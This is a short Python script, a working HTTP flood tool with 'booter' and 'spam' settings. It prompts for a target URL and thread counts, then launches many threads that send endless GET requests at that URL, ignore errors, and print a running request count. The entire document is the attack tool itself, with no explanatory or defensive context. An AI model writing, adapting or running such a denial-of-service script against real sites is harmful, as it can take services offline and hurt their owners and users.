import requests,threading,sys,time

thread_worker = 0
rps = 0
c = 0
s = 0

def ATKS():
    global thread_worker,rps,url,s
    while True:
     sys.stdout.write(f"\r [{time.ctime().split( )[3]}] SPAM={s} THREAD={thread_worker} PACKET={rps} ---> {url}")
     sys.stdout.flush()

def FLOOD(url,nulled,timeouts,wait_time):
   global rps
   if c == 1:
      while True:
          for _ in range(nulled):
           try:
            if timeouts != 0:
             r = requests.get(url,timeout=timeouts)
            else:
             r = requests.get(url)
           except:
            pass
           rps += 1
          if wait_time != 0:
            time.sleep(wait_time)
   else:
     threading.Thread(target=FLOOD,args=(url,nulled,timeouts,wait_time)).start()

url = input('URL $')
booters = int(input("BOOTER $"))
timeouts = int(input("TIMEOUT $"))
wait_time = int(input("WAIT $"))
thread = input("THREAD $")
SPAM = input("SPAM $")
threading.Thread(target=ATKS).start()
time.sleep(0.5)
for _ in range(int(thread)):
   thread_worker += 1
   if int(SPAM) != 0 and int(SPAM) != 1:
     for _ in range(int(SPAM)):
       s += 1
       threading.Thread(target=FLOOD,args=(url,booters,timeouts,wait_time)).start()
     s = 0
   else:
    threading.Thread(target=FLOOD,args=(url,booters,timeouts,wait_time)).start()
c = 1